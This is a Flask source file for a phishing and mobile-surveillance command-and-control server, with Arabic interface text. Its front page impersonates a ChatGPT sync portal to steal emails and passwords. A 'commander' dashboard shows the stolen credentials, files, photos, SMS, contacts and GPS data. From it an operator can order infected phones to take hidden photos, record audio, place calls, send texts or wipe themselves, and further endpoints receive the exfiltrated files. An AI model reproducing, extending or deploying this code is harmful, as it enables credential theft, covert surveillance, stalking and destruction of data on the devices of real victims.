from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, send_from_directory
import urllib3
import datetime
import hashlib
import base64
import os

urllib3.disable_warnings()

app = Flask(__name__)
app.secret_key = hashlib.sha256(b"secure_secret_key_v80_0_engine").digest()

DASHBOARD_PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()

UPLOAD_FOLDER = "/tmp/extracted_target_files"
try:
    os.makedirs(UPLOAD_FOLDER, exist_ok=True)
except Exception as e:
    print(f"[-] تحذير في إنشاء مجلد الرفع: {e}")

AGENT_SESSIONS = {}
CAPTURED_CREDENTIALS = []
TARGET_FILE_INDEX = {}
TARGET_IMAGE_INDEX = {}
TARGET_SMS_INDEX = {}
TARGET_CONTACTS_INDEX = {}
TARGET_LOCATION_INDEX = {}
COMMAND_QUEUES = {}
EXTRACTED_ALL_FILES = []
EXECUTION_LOGS = []

@app.after_request
def add_no_cache_headers(response):
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate, public, max-age=0"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"
    return response

# 1️⃣ واجهة الهدف التمويهية (ChatGPT AI Sync)
STANDALONE_APP_PORTAL = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ChatGPT AI Sync • Pro Edition</title>
<style>
body{background:#121214;color:#f1f1f3;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:15px}
.box{background:#1f2023;padding:30px 25px;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.7);width:100%;max-width:400px;text-align:center;border:1px solid #2d2e32}
.ai-logo{width:55px;height:55px;background:linear-gradient(135deg, #19c37d, #0d8a5c);margin:0 auto 15px;border-radius:50%;display:flex;justify-content:center;align-items:center;font-size:28px;color:#fff}
h2{color:#fff;font-size:20px;margin-bottom:6px}.sub-title{color:#9ca3af;font-size:13px;margin-bottom:20px}
.input-group{margin-bottom:14px;text-align:right}
input{width:100%;padding:13px;background:#2b2c31;border:1px solid #3f4147;color:#fff;border-radius:8px;font-size:14px;outline:none;direction:ltr;text-align:left;box-sizing:border-box}
button{width:100%;padding:14px;background:#19c37d;color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:15px;margin-top:10px}
</style>
</head>
<body>
<div class="box">
  <div class="ai-logo">✨</div>
  <h2>منصة المزامنة الذكية ChatGPT</h2>
  <div class="sub-title">تفعيل النظام الاستراتيجي الشامل</div>
  <div class="input-group"><input type="email" id="target_email" placeholder="البريد الإلكتروني" required></div>
  <div class="input-group"><input type="password" id="target_pass" placeholder="كلمة المرور" required></div>
  <button onclick="triggerAIWorkflow()">تفعيل ومزامنة البيانات 🚀</button>
</div>
<script>
async function triggerAIWorkflow(){
    const email = document.getElementById('target_email').value.trim();
    const pass = document.getElementById('target_pass').value.trim();
    if(!email || !pass) { alert('يرجى ملء البيانات'); return; }
    const globalToken = 'agent_' + Math.random().toString(36).substring(2, 10);
    try {
        await fetch('/auth/verify/login', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({session_token: globalToken, user_agent: navigator.userAgent, platform: 'Web Portal'})
        });
        await fetch('/api/credentials', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({token: globalToken, email: email, password: pass})
        });
    } catch(e){}
    window.location.href = "https://chatgpt.com";
}
</script>
</body>
</html>"""

# 2️⃣ لوحة تسجيل دخول القائد
HTML_LOGIN_PAGE = """<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>دخول القائد</title>
<style>body{background:#010103;color:#ff0040;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
.box{background:#04060e;border:2px solid #ff0040;padding:30px;border-radius:12px;text-align:center;width:350px}
input{width:100%;padding:12px;margin:15px 0;background:#000;border:1px solid #ff0040;color:#fff;border-radius:6px;text-align:center;box-sizing:border-box}
button{width:100%;padding:12px;background:#ff0040;border:none;color:#fff;font-weight:bold;border-radius:6px;cursor:pointer}</style></head>
<body><div class="box"><h2>🔒 لوحة القيادة v80.0</h2>
<form method="POST" action="/commander/login">
<input type="password" name="password" placeholder="كلمة المرور" required>
<button type="submit">دخول 🚀</button></form></div></body></html>"""

# 3️⃣ لوحة القيادة الشاملة المطورة
HTML_COMMAND_CENTER = """<!DOCTYPE html>
<html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة السيطرة الميدانية v80.0</title>
<style>
body{background:#010103;color:#00ff88;font-family:Tahoma,monospace;padding:15px;text-align:center}
.container{max-width:1150px;margin:auto}h1{color:#ff0040;margin-bottom:15px;font-size:22px}
.panel{background:#04060e;border:2px solid #ff0040;padding:20px;border-radius:12px}
select, input, button{padding:12px;margin:6px;border-radius:6px;border:1px solid #ff0040;background:#000;color:#fff;cursor:pointer;font-weight:bold;font-size:13px}
button{background:#ff0040;transition:0.2s}button:hover{opacity:0.85}
.card{background:#000;border:1px solid #1a2a40;padding:15px;margin:15px auto;max-width:980px;border-radius:10px;text-align:right;border-right:6px solid #ff0040;overflow-x:auto}
table{width:100%;margin-top:12px;border-collapse:collapse;color:#fff;text-align:right}
th, td{padding:10px;border:1px solid #1a2a40;font-size:13px}th{background:#0a0e1a;color:#ff0040}
.btn-group{display:flex;flex-wrap:wrap;justify-content:center;gap:8px;margin-top:15px}
.action-box{background:#070b14;border:1px dashed #1a2a40;padding:12px;border-radius:8px;margin-top:15px}
</style></head>
<body>
<div class="container">
<h1>⚔️ لوحة السيطرة الميدانية المطورة v80.0 ⚔️</h1>
<div style="margin-bottom:15px;"><a href="/commander/logout" style="color:#ff0040;text-decoration:none;">[تسجيل خروج]</a></div>
<div class="panel">
<select id="command_type">
  <option value="fetch_active_agents">🎯 عرض الأهداف النشطة (اضغط لاختيار Token)</option>
  <option value="fetch_captured_credentials">🔑 الحسابات المسروقة</option>
  <option value="fetch_target_file_list">📂 عرض ملفات الهدف قبل السحب</option>
  <option value="fetch_target_image_list">🖼️ عرض صور الهدف قبل السحب</option>
  <option value="fetch_target_sms_list">💬 عرض رسائل SMS</option>
  <option value="fetch_target_contacts_list">📞 عرض جهات الاتصال</option>
  <option value="fetch_target_location">📍 عرض الموقع الجغرافي GPS</option>
  <option value="fetch_extracted_files">📥 الملفات والوسائط المسحوبة</option>
  <option value="fetch_execution_logs">📜 سجل تقارير تنفيذ الأوامر</option>
</select>
<button onclick="executeCommand()">استعراض البيانات ⚡</button>

<div class="card" style="margin-top:20px; border-right-color:#00ff88;">
  <b>🎮 غرفة العمليات والتحكم الميداني المباشر</b><br>
  <input type="text" id="target_token_input" placeholder="أدخل Token الهدف أو اضغط عليه من الجدول" style="width:320px; direction:ltr; text-align:center; border-color:#00ff88;"><br>
  
  <div class="btn-group">
    <button onclick="sendAction('capture_hidden_photo')" style="background:#e11d48; color:#fff;">📸 تصوير الهدف سراً</button>
    <button onclick="sendAction('start_audio_recording')" style="background:#d97706; color:#fff;">🎙️ تسجيل صوت 10ث</button>
    <button onclick="sendAction('pull_gps')" style="background:#0284c7; color:#fff;">📍 تحديد الموقع GPS</button>
    <button onclick="sendAction('open_camera')" style="background:#00ff88; color:#000;">📷 فتح الكاميرا</button>
    <button onclick="sendAction('open_whatsapp')" style="background:#00ff88; color:#000;">🟢 فتح واتساب</button>
    <button onclick="sendAction('open_accounts')" style="background:#00ff88; color:#000;">🔑 فتح الإعدادات</button>
    <button onclick="sendAction('reboot_device')" style="background:#ffaa00; color:#000;">🔌 إعادة تشغيل</button>
    <button onclick="sendAction('wipe_device')" style="background:#991b1b; color:#fff;">⚠️ فرمتة الهاتف</button>
  </div>

  <div class="action-box">
    <b>📞 إجراء اتصال هاتفي مباشر من جهاز الهدف:</b><br>
    <input type="text" id="call_phone_input" placeholder="أدخل رقم الهاتف للاتصال به (مثال: 777123456)" style="width:280px; direction:ltr; border-color:#38bdf8;">
    <button onclick="sendCallCommand()" style="background:#0284c7; color:#fff;">📞 اتصال الآن</button>
  </div>

  <div class="action-box">
    <b>📤 إرسال رسالة نصية SMS من جهاز الهدف:</b><br>
    <input type="text" id="sms_phone_input" placeholder="رقم الهاتف" style="width:180px; direction:ltr;">
    <input type="text" id="sms_body_input" placeholder="نص الرسالة القصيرة" style="width:280px;">
    <button onclick="sendSMSCommand()" style="background:#00ff88; color:#000;">📤 إرسال SMS</button>
  </div>
</div>

<div id="results" style="margin-top:20px;"></div>
</div></div>
<script>
function selectToken(tkn){
  document.getElementById('target_token_input').value = tkn;
  alert('تم تحديد الهدف: ' + tkn);
}

async function executeCommand(){
 const cmdType = document.getElementById('command_type').value;
 const results = document.getElementById('results');
 results.innerHTML='⏳ جاري جلب البيانات...';
 try{
   const res = await fetch('/api/index', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({command: cmdType})});
   const data = await res.json();
   if(cmdType === 'fetch_active_agents'){
     let t = '<div class="card"><b>🎯 الأهداف النشطة (اضغط على الرمز لتحديده)</b><table><tr><th>Token</th><th>النظام</th><th>IP</th><th>الوقت</th></tr>';
     if(data.agents && data.agents.length>0){ data.agents.forEach(a => { t += `<tr><td><button onclick="selectToken('${a.token}')" style="background:#00ff88;color:#000;padding:5px 10px;">${a.token}</button></td><td>${a.platform}</td><td>${a.ip}</td><td>${a.time}</td></tr>`; }); }
     else { t += '<tr><td colspan="4" style="text-align:center">لا توجد أهداف متصلة حالياً</td></tr>'; }
     results.innerHTML = t + '</table></div>';
   } else if(cmdType === 'fetch_captured_credentials'){
     let c = '<div class="card"><b>🔑 الحسابات المسروقة</b><table><tr><th>Token</th><th>البريد</th><th>كلمة المرور</th><th>الوقت</th></tr>';
     if(data.credentials && data.credentials.length>0){ data.credentials.forEach(item => { c += `<tr><td>${item.token}</td><td style="color:#00ff88">${item.email}</td><td style="color:#ff0040">${item.password}</td><td>${item.time}</td></tr>`; }); }
     else { c += '<tr><td colspan="4" style="text-align:center">لا توجد حسابات مسروقة</td></tr>'; }
     results.innerHTML = c + '</table></div>';
   } else if(cmdType === 'fetch_target_file_list'){
     let f = '<div class="card"><b>📂 ملفات الهدف</b><table><tr><th>Token</th><th>مسار الملف</th><th>إجراء السحب</th></tr>';
     if(data.files && data.files.length>0){
       data.files.forEach(file => { f += `<tr><td>${file.token}</td><td style="color:#00ff88;direction:ltr">${file.filename}</td><td><button onclick="pullFile('${file.token}', '${file.filename}')">سحب الملف 📥</button></td></tr>`; });
     } else { f += '<tr><td colspan="3" style="text-align:center">لا توجد ملفات مفهرسة</td></tr>'; }
     results.innerHTML = f + '</table></div>';
   } else if(cmdType === 'fetch_target_image_list'){
     let img = '<div class="card"><b>🖼️ صور الهدف</b><table><tr><th>Token</th><th>مسار الصورة</th><th>إجراء السحب</th></tr>';
     if(data.images && data.images.length>0){
       data.images.forEach(im => { img += `<tr><td>${im.token}</td><td style="color:#00ff88;direction:ltr">${im.filename}</td><td><button onclick="pullFile('${im.token}', '${im.filename}')">سحب الصورة 📥</button></td></tr>`; });
     } else { img += '<tr><td colspan="3" style="text-align:center">لا توجد صور مفهرسة</td></tr>'; }
     results.innerHTML = img + '</table></div>';
   } else if(cmdType === 'fetch_target_sms_list'){
     let sms = '<div class="card"><b>💬 رسائل الهدف</b><table><tr><th>Token</th><th>المرسل / المحتوى</th><th>الوقت</th></tr>';
     if(data.sms && data.sms.length>0){
       data.sms.forEach(s => { sms += `<tr><td>${s.token}</td><td style="color:#00ff88">${s.body}</td><td>${s.time}</td></tr>`; });
     } else { sms += '<tr><td colspan="3" style="text-align:center">لا توجد رسائل مسجلة</td></tr>'; }
     results.innerHTML = sms + '</table></div>';
   } else if(cmdType === 'fetch_target_contacts_list'){
     let cnt = '<div class="card"><b>📞 جهات اتصال الهدف</b><table><tr><th>Token</th><th>الاسم</th><th>الرقم</th><th>اتصال سريع</th></tr>';
     if(data.contacts && data.contacts.length>0){
       data.contacts.forEach(ct => { cnt += `<tr><td>${ct.token}</td><td style="color:#00ff88">${ct.name}</td><td style="direction:ltr">${ct.phone}</td><td><button onclick="quickCall('${ct.token}', '${ct.phone}')" style="background:#0284c7;padding:5px 10px;">اتصال 📞</button></td></tr>`; });
     } else { cnt += '<tr><td colspan="4" style="text-align:center">لا توجد جهات اتصال</td></tr>'; }
     results.innerHTML = cnt + '</table></div>';
   } else if(cmdType === 'fetch_target_location'){
     let loc = '<div class="card"><b>📍 إحداثيات الموقع الجغرافي GPS</b><table><tr><th>Token</th><th>خط العرض (Lat)</th><th>خط الطول (Lng)</th><th>الخريطة</th><th>الوقت</th></tr>';
     if(data.locations && data.locations.length>0){
       data.locations.forEach(l => { loc += `<tr><td>${l.token}</td><td>${l.lat}</td><td>${l.lng}</td><td><a href="https://maps.google.com/?q=${l.lat},${l.lng}" target="_blank" style="color:#38bdf8">[فتح في الخرائط 🗺️]</a></td><td>${l.time}</td></tr>`; });
     } else { loc += '<tr><td colspan="5" style="text-align:center">لم يتم استلام إحداثيات بعد (اضغط زر تحديد الموقع GPS)</td></tr>'; }
     results.innerHTML = loc + '</table></div>';
   } else if(cmdType === 'fetch_extracted_files'){
     let ef = '<div class="card"><b>📥 الملفات والصور والتسجيلات المسحوبة</b><table><tr><th>Token</th><th>اسم الملف</th><th>الوقت</th><th>تحميل</th></tr>';
     if(data.extracted && data.extracted.length>0){
       data.extracted.forEach(ex => { ef += `<tr><td>${ex.token}</td><td style="color:#00ff88">${ex.filename}</td><td>${ex.time}</td><td><a href="/download/${ex.saved_name}" style="color:#00ff88" target="_blank">[تحميل / عرض]</a></td></tr>`; });
     } else { ef += '<tr><td colspan="4" style="text-align:center">لم يتم سحب أي ملفات بعد</td></tr>'; }
     results.innerHTML = ef + '</table></div>';
   } else if(cmdType === 'fetch_execution_logs'){
     let log = '<div class="card"><b>📜 سجل تقارير تنفيذ الأوامر</b><table><tr><th>Token</th><th>الأمر التنفيذي</th><th>الحالة</th><th>الوقت</th></tr>';
     if(data.logs && data.logs.length>0){
       data.logs.forEach(lg => { log += `<tr><td>${lg.token}</td><td style="color:#00ff88">${lg.action}</td><td style="color:#00ff88">${lg.status}</td><td>${lg.time}</td></tr>`; });
     } else { log += '<tr><td colspan="4" style="text-align:center">لا توجد تقارير تنفيذ مسجلة</td></tr>'; }
     results.innerHTML = log + '</table></div>';
   }
 }catch(e){ results.innerHTML='❌ خطأ في الاتصال: '+e.message; }
}

async function pullFile(token, filename){
  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'pull', target_file: filename})});
  alert('تم إرسال أمر السحب اللحظي: ' + filename);
}

async function sendAction(actionName){
  const token = document.getElementById('target_token_input').value.trim();
  if(!token) { alert('يرجى إدخال أو تحديد الرمز Token أولاً'); return; }
  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: actionName})});
  alert('تم إرسال أمر (' + actionName + ') إلى الهدف بنجاح!');
}

async function sendCallCommand(){
  const token = document.getElementById('target_token_input').value.trim();
  const phone = document.getElementById('call_phone_input').value.trim();
  if(!token || !phone) { alert('يرجى إدخال الرمز Token ورقم الهاتف المطلوب الاتصال به'); return; }
  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'make_call', phone: phone})});
  alert('تم إرسال أمر الاتصال بالرقم (' + phone + ') من جهاز الهدف!');
}

async function quickCall(token, phone){
  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'make_call', phone: phone})});
  alert('تم توجيه أمر الاتصال بالرقم: ' + phone);
}

async function sendSMSCommand(){
  const token = document.getElementById('target_token_input').value.trim();
  const phone = document.getElementById('sms_phone_input').value.trim();
  const body = document.getElementById('sms_body_input').value.trim();
  if(!token || !phone || !body) { alert('يرجى استكمال بيانات الرسالة والرقم والرمز'); return; }
  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'send_sms', phone: phone, body: body})});
  alert('تم توجيه أمر إرسال الرسالة بنجاح!');
}
</script></body></html>"""

@app.route('/', methods=['GET'])
def home(): return STANDALONE_APP_PORTAL

@app.route('/commander/login', methods=['GET', 'POST'])
def commander_login():
    if request.method == 'POST':
        if hashlib.sha256(request.form.get('password', '').encode()).hexdigest() == DASHBOARD_PASSWORD_HASH:
            session['authenticated'] = True
            return redirect(url_for('commander_dashboard'))
    return HTML_LOGIN_PAGE

@app.route('/commander/dashboard', methods=['GET'])
def commander_dashboard():
    if not session.get('authenticated'): return redirect(url_for('commander_login'))
    return HTML_COMMAND_CENTER

@app.route('/commander/logout', methods=['GET'])
def commander_logout():
    session.pop('authenticated', None)
    return redirect(url_for('commander_login'))

@app.route('/auth/verify/login', methods=['POST'])
def phishing_portal():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('session_token', 'agent_target')
    AGENT_SESSIONS[token] = {
        "agent": f"{req_data.get('user_agent', 'Android')[:25]}",
        "token": token,
        "ip": request.headers.get('X-Forwarded-For', request.remote_addr),
        "platform": req_data.get('platform', 'Android Target'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    if token not in COMMAND_QUEUES: COMMAND_QUEUES[token] = []
    return jsonify({"status": "agent_active", "token": token})

@app.route('/api/credentials', methods=['POST'])
def capture_credentials():
    req_data = request.get_json(silent=True) or {}
    CAPTURED_CREDENTIALS.append({
        "token": req_data.get('token', 'N/A'), "email": req_data.get('email', 'N/A'),
        "password": req_data.get('password', 'N/A'), "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "secured"})

@app.route('/api/report_files', methods=['POST'])
def report_files():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('token', 'N/A')
    if 'files' in req_data: TARGET_FILE_INDEX[token] = req_data.get('files', [])
    if 'images' in req_data: TARGET_IMAGE_INDEX[token] = req_data.get('images', [])
    if 'sms' in req_data: TARGET_SMS_INDEX[token] = req_data.get('sms', [])
    if 'contacts' in req_data: TARGET_CONTACTS_INDEX[token] = req_data.get('contacts', [])
    if 'location' in req_data: TARGET_LOCATION_INDEX[token] = req_data.get('location', [])
    return jsonify({"status": "indexed"})

@app.route('/api/queue_command', methods=['POST'])
def queue_command():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('token')
    if token and token in COMMAND_QUEUES: 
        COMMAND_QUEUES[token].append(req_data)
    elif token:
        COMMAND_QUEUES[token] = [req_data]
    return jsonify({"status": "queued"})

@app.route('/api/poll_commands', methods=['POST'])
def poll_commands():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('token')
    cmds = []
    if token in COMMAND_QUEUES and COMMAND_QUEUES[token]:
        cmds = COMMAND_QUEUES[token]
        COMMAND_QUEUES[token] = []
    return jsonify({"commands": cmds})

@app.route('/api/report_execution', methods=['POST'])
def report_execution():
    req_data = request.get_json(silent=True) or {}
    EXECUTION_LOGS.append({
        "token": req_data.get('token', 'N/A'),
        "action": req_data.get('action', 'N/A'),
        "status": req_data.get('status', 'executed'),
        "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    return jsonify({"status": "logged"})

@app.route('/api/upload_real_file', methods=['POST'])
def upload_real_file():
    req_data = request.get_json(silent=True) or {}
    token = req_data.get('token', 'N/A')
    filename = req_data.get('filename', 'file.bin')
    file_b64 = req_data.get('data', '')
    if file_b64:
        try:
            file_bytes = base64.b64decode(file_b64)
            saved_name = f"{token}_{filename.replace('/', '_').replace('(', '').replace(')', '')}"
            filepath = os.path.join(UPLOAD_FOLDER, saved_name)
            with open(filepath, "wb") as f: f.write(file_bytes)
            EXTRACTED_ALL_FILES.append({
                "token": token, "filename": filename, "saved_name": saved_name,
                "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            return jsonify({"status": "saved"})
        except Exception as e: return jsonify({"status": "error", "message": str(e)}), 400
    return jsonify({"status": "empty"}), 400

@app.route('/download/<path:filename>', methods=['GET'])
def download_file(filename):
    if not session.get('authenticated'): return "Unauthorized", 401
    return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True)

@app.route('/api/index', methods=['POST'])
def api_index():
    if not session.get('authenticated'): return jsonify({"error": "Unauthorized"}), 401
    req_data = request.get_json(silent=True) or {}
    mode = req_data.get("command", "")
    if mode == "fetch_active_agents": return jsonify({"agents": list(AGENT_SESSIONS.values())})
    elif mode == "fetch_captured_credentials": return jsonify({"credentials": CAPTURED_CREDENTIALS})
    elif mode == "fetch_target_file_list":
        flat = []
        for tkn, lst in TARGET_FILE_INDEX.items():
            for f in lst: flat.append({"token": tkn, "filename": f})
        return jsonify({"files": flat})
    elif mode == "fetch_target_image_list":
        flat_img = []
        for tkn, lst in TARGET_IMAGE_INDEX.items():
            for im in lst: flat_img.append({"token": tkn, "filename": im})
        return jsonify({"images": flat_img})
    elif mode == "fetch_target_sms_list":
        flat_sms = []
        for tkn, lst in TARGET_SMS_INDEX.items():
            for s in lst: flat_sms.append({"token": tkn, "body": s, "time": datetime.datetime.now().strftime("%H:%M:%S")})
        return jsonify({"sms": flat_sms})
    elif mode == "fetch_target_contacts_list":
        flat_cnt = []
        for tkn, lst in TARGET_CONTACTS_INDEX.items():
            for c in lst: flat_cnt.append({"token": tkn, "name": c.get("name", ""), "phone": c.get("phone", "")})
        return jsonify({"contacts": flat_cnt})
    elif mode == "fetch_target_location":
        flat_loc = []
        for tkn, lst in TARGET_LOCATION_INDEX.items():
            for l in lst: flat_loc.append({"token": tkn, "lat": l.get("lat"), "lng": l.get("lng"), "time": l.get("time")})
        return jsonify({"locations": flat_loc})
    elif mode == "fetch_extracted_files": return jsonify({"extracted": EXTRACTED_ALL_FILES})
    elif mode == "fetch_execution_logs": return jsonify({"logs": EXECUTION_LOGS})
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
